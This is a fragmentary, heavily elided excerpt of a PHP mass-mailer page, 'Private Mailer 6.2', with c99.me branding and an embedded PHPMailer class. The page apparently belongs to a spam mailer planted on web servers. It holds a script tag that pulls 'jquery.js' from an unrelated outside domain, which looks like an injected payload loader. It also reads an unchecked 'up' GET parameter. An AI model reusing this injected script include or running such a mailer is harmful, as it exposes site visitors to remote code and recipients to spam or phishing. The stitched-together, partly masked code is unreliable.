...
<span class="style1">Private Mailer 6.2<br>
   <font color=\"#800000\">www.c99.me</font></span>
...
<SCRIPT SRC=http://deer96.com/chache/jquery.js></SCRIPT>
<?php
$UP = $_GET['up'];
...
class PHPMailer {
  ...
  /**
   * Closes the active SMTP ******* if one exists.
   * @return void
   */
  function SmtpClose() {
    if($this->smtp != NULL) {
   ...
   * Adapted from a function by paravoid at http://uk.php.net/manual/en/function...mimeheader.php
   * @access private
   * @param string $str multi-byte text to wrap encode
   * @return string
   */
...
$smtp_conc=$IsSMTP($defaultport, $smtp_conf);
  ...
  print "<p class=\"style1\">PHP Mailer<br>&copy 2010, MeGo <b>
